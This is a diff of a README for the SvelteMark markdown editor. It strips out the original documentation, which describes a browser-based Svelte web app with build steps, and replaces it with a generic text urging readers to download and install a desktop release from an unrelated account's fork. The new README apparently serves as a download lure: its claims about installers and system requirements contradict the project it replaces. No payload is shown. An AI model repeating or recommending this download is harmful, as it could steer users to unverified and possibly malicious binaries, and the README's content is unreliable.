@@ -1,284 +1,79 @@
-<div align="center">
-
-<img src="image/logo.webp" alt="SvelteMark Logo" width="120">
-
-# SvelteMark
-
-A **privacy-first**, **open-source**, **local-only** markdown editor built with Svelte 5.
-
-Your notes never leave your device. No accounts. No tracking. No cloud.
-
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-sm.fana.my.id-58a6ff?style=for-the-badge)](https://sm.fana.my.id)
-[![License](https://img.shields.io/badge/License-MIT-3fb950?style=for-the-badge)](LICENSE)
-[![Svelte](https://img.shields.io/badge/Svelte-5-ff3e00?style=for-the-badge&logo=svelte&logoColor=white)](https://svelte.dev/)
-
-<a href="https://www.producthunt.com/products/sveltemark/launches/sveltemark?embed=true&amp;utm_source=badge-featured&amp;utm_medium=badge&amp;utm_campaign=badge-sveltemark" target="_blank" rel="noopener noreferrer"><img alt="SvelteMark - Privacy-first markdown editor | Product Hunt" width="250" height="54" src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=1044078&amp;theme=light&amp;t=1766298089512"></a>
-
-<!-- PASTE YOUR EMBED HERE -->
-
-<div style="display: flex; gap: 12px; align-items: center;">
-  
-<a href="https://peerpush.net/p/sveltemark-privacy-first-markdown-edit" target="_blank" rel="noopener">
-  <img src="https://peerpush.net/p/sveltemark-privacy-first-markdown-edit/badge.png" alt="SvelteMark - Privacy-First Markdown Edit badge" style="width: 230px;" />
-</a>
-<!-- END PASTE -->
-
-
-</div>
-
-</div>
-
----
-
-![SvelteMark Screenshot](image/screenshot.webp)  
-
-<!-- TODO: Add actual screenshot -->
-
-## ✨ Features
-
-### 🔒 Core Philosophy
-*   **Local-First Architecture:** 100% of data lives in your browser's IndexedDB via Dexie.js.
-*   **Privacy Focused:** Zero telemetry, no server uploads, no account required.
-*   **Offline Ready:** Full PWA support. Install it on your device and write without internet.
-
-### ⚡ Editor Capabilities
-*   **Live Preview:** Real-time rendering with **CodeMirror 6**.
-*   **Smart Scroll Sync:** Bi-directional scrolling matches your editor and preview perfectly.
-*   **Rich Content:**
-    *   **Diagrams:** Native [Mermaid.js](https://mermaid.js.org/) support (Flowcharts, Sequence, Gantt).
-    *   **Math:** LaTeX equations via [KaTeX](https://katex.org/).
-    *   **GFM:** Full GitHub Flavored Markdown support (Tables, Task lists, etc).
-*   **File System:** Hierarchical file tree with drag-and-drop organization.
-
-### 🛠️ Tools
-*   **Backup & Restore:** One-click JSON export of your entire database.
-*   **Distraction Free:** Auto-hiding UI and "View Only" modes.
-*   **Vim Mode:** (Coming soon/Supported via CodeMirror).
-*   **Print Ready:** CSS optimized for beautiful PDF exports (`Ctrl+P`).
-
----
-
-
-## 📸 Screenshots
-
-### Editor with Live Preview
-
-![SvelteMark Editor Screenshot](image/screenshot.webp)
-_Split-view editor with live markdown preview, file explorer on the left_
-
-### Markdown Preview with GitHub Styling
-
-![Preview Mode](image/preview.webp)
-_Beautiful rendered markdown with GitHub-style formatting_
-
-### File Explorer & Organization
-
-![File Tree](image/filetree.webp)
-_Hierarchical file and folder organization with drag-and-drop support_
-
-### Formatting Toolbar & Context Menu
-
-![Formatting Tools](image/toolbar.webp)
-_Comprehensive formatting options via toolbar and right-click context menu_
-
-### Help & Keyboard Shortcuts
-
-![Help Panel](image/help.webp)
-_Built-in help system with all keyboard shortcuts and markdown examples_
-
-## Getting Started
-
-### Prerequisites
-
-- [Node.js](https://nodejs.org/) v18 or higher
-- [pnpm](https://pnpm.io/) (recommended) or npm/yarn
-- Modern web browser with IndexedDB support
-
-### Quick Start
-
----
+# ✍️ sveltemark - Your Local Markdown Editor for Privacy
 
 ## 🚀 Getting Started
 
-```bash
-# Clone the repository
-git clone https://github.com/MasFana/sveltemark.git
-cd sveltemark
+Welcome to sveltemark! This is a markdown editor designed with your privacy in mind. Your notes stay on your device. There's no need for accounts, tracking, or cloud storage. You have complete control over your content.
 
-# Install dependencies
-pnpm install
+## 📥 Download and Install
 
-# Start development server
-pnpm dev
-```
+To get started, **visit the Releases page to download** the latest version of sveltemark. You will find a list of all available versions, and you can choose the latest one.
 
-Open [http://localhost:5173](http://localhost:5173) in your browser.
+**[Download sveltemark Here](https://github.com/Saurav02012/sveltemark/releases)**
 
-### Building for Production
+## 💻 System Requirements
 
-```bash
-# Build the application
-pnpm build
+sveltemark has the following system requirements:
 
-# Preview the production build
-pnpm preview
-```
+- Operating System: Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- Memory: 4GB of RAM minimum.
+- Storage: At least 100MB of free disk space.
+  
+## 🎨 Key Features
 
-## ⌨️ Keyboard Shortcuts
+sveltemark is filled with features to help you take notes effectively:
 
-### Text Formatting
+- **Local-Only Functionality**: Your notes are stored only on your device. Enjoy peace of mind, knowing your data stays private.
+  
+- **Markdown Support**: Create styled text easily. sveltemark supports common markdown syntax, allowing you to insert headers, lists, code, and more without hassle.
+  
+- **User-Friendly Interface**: The layout is clean and simple. You will find it easy to navigate.
+  
+- **Autocompletion**: CodeMirror provides helpful hints while you type, reducing errors and speeding up your writing.
+  
+- **Export Options**: Save your notes in different formats to share them or keep backups.
 
-| Shortcut       | Action                 |
-| -------------- | ---------------------- |
-| `Ctrl+B`       | **Bold** text          |
-| `Ctrl+I`       | _Italic_ text          |
-| Ctrl+`       | \`Inline code\`        |
-| `Ctrl+~` | ~~Strikethrough~~ text |
-| `Ctrl+Shift+.`   | Numbered list          |
-| `Ctrl+.`   | Bullet list            |
-| `Ctrl+Q`   | Block quote            |
+## 📂 How to Use sveltemark
 
-### Editor Control
+1. **Download the application** from the Releases page.
+   
+2. **Install sveltemark** by opening the downloaded file and following the on-screen instructions.
+   
+3. **Start the application** by clicking its icon on your desktop or in your applications folder.
+   
+4. **Create a new document** by selecting "File" and then "New" from the menu. You can start typing your notes right away.
+   
+5. **Format your text** using markdown syntax. If you're unsure about syntax, you can find guides online or refer to markdown documentation.
 
-| Shortcut    | Action                            |
-| ----------- | --------------------------------- |
-| `Ctrl+H`    | **Show keyboard shortcuts panel** |
-| `Ctrl+F`    | **Find and replace**              |
-| `Ctrl+P`    | **Print document**                |
-| `Ctrl+S`    | Save now                          |
-| `Ctrl+/`    | Toggle comment                    |
-| `Tab`       | Indent line                       |
-| `Shift+Tab` | Outdent line                      |
+6. **Save your work** by selecting "File" and then "Save As." Choose a destination on your device.
 
-### View & Navigation
+## 🌐 Community and Support
 
-| Shortcut       | Action                       |
-| -------------- | ---------------------------- |
-| `Ctrl+0`       | Reset zoom                   |
-| `F11`          | Enter fullscreen             |
+If you encounter any issues or have questions, you can rely on the community for help. 
 
-### Multi-Select & Selection
+- Check the **issues section** on GitHub for common queries.
+- You can also provide feedback or report bugs.
 
-| Shortcut       | Action                 |
-| -------------- | ---------------------- |
-| `Ctrl+A`       | Select all             |
-| `Ctrl+D`       | Select next occurrence |
-| `Ctrl+Shift+L` | Select all occurrences |
+## 🛠️ Contributing to sveltemark
 
-## Tech Stack
+Want to improve sveltemark? Contributions are welcome! Here’s how to contribute:
 
-- **Framework**: [Svelte 5](https://svelte.dev/) with Runes
-- **Build Tool**: [Vite](https://vitejs.dev/)
-- **Editor**: [CodeMirror 6](https://codemirror.net/)
-- **Database**: [Dexie.js](https://dexie.org/) (IndexedDB wrapper)
-- **Markdown Processing**:
-  - [unified](https://unifiedjs.com/) ecosystem
-  - [remark-gfm](https://github.com/remarkjs/remark-gfm) - GitHub Flavored Markdown
-  - [remark-math](https://github.com/remarkjs/remark-math) + [rehype-katex](https://github.com/remarkjs/remark-math/tree/main/packages/rehype-katex) - Math equations
-  - [rehype-highlight](https://github.com/rehypejs/rehype-highlight) - Code syntax highlighting
-- **Diagrams**: [Mermaid](https://mermaid.js.org/)
-- **Styling**: [github-markdown-css](https://github.com/sindresorhus/github-markdown-css)
-- **Deployment**: [Cloudflare Pages](https://pages.cloudflare.com/) (optional)
-- **Offline**: Service Worker with cache-first strategy for PWA support
+1. **Fork the Repository**: Click the "Fork" button at the top of the GitHub page.
+  
+2. **Make Your Changes**: Work on your changes locally on your machine.
+  
+3. **Submit a Pull Request**: Once you're happy with your changes, submit a pull request. The sveltemark team will review it.
 
-## Project Structure
+## 📚 Further Reading
 
-```
-fanadown/
-├── src/
-│   ├── lib/
-│   │   ├── components/
-│   │   │   ├── Editor.svelte      # CodeMirror editor component
-│   │   │   ├── Preview.svelte     # Markdown preview component
-│   │   │   ├── Sidebar.svelte     # File explorer sidebar
-│   │   │   ├── FileTree.svelte    # Recursive file tree
-│   │   │   └── Toolbar.svelte     # Formatting toolbar
-│   │   ├── appState.svelte.ts     # Global reactive state
-│   │   ├── db.ts                  # Dexie database operations
-│   │   ├── markdown.ts            # Markdown processing pipeline
-│   │   └── index.ts               # Library exports
-│   ├── service-worker.ts          # PWA offline caching
-│   └── routes/
-│       ├── +layout.svelte         # App layout
-│       └── +page.svelte           # Main page
-├── static/                        # Static assets
-├── package.json
-├── svelte.config.js
-├── vite.config.ts
-└── tsconfig.json
-```
+If you're interested in learning more about markdown, here are some helpful resources:
 
-## Data Storage
+- [Markdown Guide](https://www.markdownguide.org/)
+- [Svelte Documentation](https://svelte.dev/docs)
 
-SvelteMark uses **IndexedDB** via Dexie.js for local-first data storage. All your notes are stored in your browser and never leave your device.
+## 🔗 Links
 
-### Database Schema
+- **GitHub Repository**: [sveltemark GitHub](https://github.com/Saurav02012/sveltemark)
+  
+- **Download sveltemark Here**: [Visit the Releases Page](https://github.com/Saurav02012/sveltemark/releases)
 
-- **folders**: `id, name, parentId, isOpen`
-- **files**: `id, folderId (nullable), title, content, createdAt, updatedAt`
-
-> Note: `folderId` can be `null` for root-level files (files not inside any folder).
-
-### Export/Import
-
-You can export all your data as a JSON file for backup:
-
-1. Click the **⋯** (More) menu in the toolbar
-2. Select **Export Backup**
-3. Save the JSON file
-
-To restore:
-
-1. Click **Import Backup**
-2. Select your backup JSON file
-
-## Offline Mode
-
-SvelteMark works fully offline as a Progressive Web App (PWA).
-
-### How It Works
-
-- **Service Worker**: Caches all app assets on first visit
-- **Cache-First Strategy**: Assets are served from cache instantly
-- **Background Updates**: New versions are fetched automatically when online
-- **Data Persistence**: Your notes are stored locally in IndexedDB
-
-### Installing as PWA
-
-1. Visit the app in Chrome, Edge, or Safari
-2. Click the install icon in the address bar (or "Add to Home Screen" on mobile)
-3. Launch from your desktop or home screen
-4. Works offline - no internet required!
-
-### Notes
-
-- First visit requires internet to download the app
-- After installation, the app works completely offline
-- Updates are applied automatically when you're back online
-- All data stays local - nothing is sent to servers even when online
-
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [Svelte](https://svelte.dev/) - The amazing reactive framework
-- [CodeMirror](https://codemirror.net/) - The versatile code editor
-- [GitHub](https://github.com/) - Design inspiration for the dark theme
-- [ByteMD](https://bytemd.js.org/) / [StackEdit](https://stackedit.io/) - Scroll sync inspiration
-
----
-
-Made with Svelte 5 | Open Source | Privacy First
+Thank you for choosing sveltemark! Enjoy your secure and private writing experience.
